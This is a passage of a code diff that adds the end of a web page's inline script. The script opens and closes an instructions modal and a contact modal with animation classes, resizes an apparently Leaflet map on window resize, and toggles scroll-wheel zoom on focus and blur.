+        var modal = document.getElementById('instructionsModal');
+        modal.classList.remove('hidden');
+        modal.classList.add('modal-enter');
+        setTimeout(() => modal.classList.remove('modal-enter'), 300);
+      });
+
+      document.getElementById('instructionsCloseBtn').addEventListener('click', function() {
+        var modal = document.getElementById('instructionsModal');
+        modal.classList.add('modal-exit');
+        setTimeout(() => {
+          modal.classList.add('hidden');
+          modal.classList.remove('modal-exit');
+        }, 300);
+      });
+
+      // Contact Modal
+      document.getElementById('contactBtn').addEventListener('click', function() {
+        var modal = document.getElementById('contactModal');
+        modal.classList.remove('hidden');
+        modal.classList.add('modal-enter');
+        setTimeout(() => modal.classList.remove('modal-enter'), 300);
+      });
+
+      document.getElementById('contactCloseBtn').addEventListener('click', function() {
+        var modal = document.getElementById('contactModal');
+        modal.classList.add('modal-exit');
+        setTimeout(() => {
+          modal.classList.add('hidden');
+          modal.classList.remove('modal-exit');
+        }, 300);
+      });
+
+      window.addEventListener('resize', function() {
+        if (map) {
+          map.invalidateSize();
+        }
+      });
+
+      map.on('focus', function() {
+        map.scrollWheelZoom.enable();
+      });
+
+      map.on('blur', function() {
+        map.scrollWheelZoom.disable();
+      });
+    });
+  </script>
+</body></html>
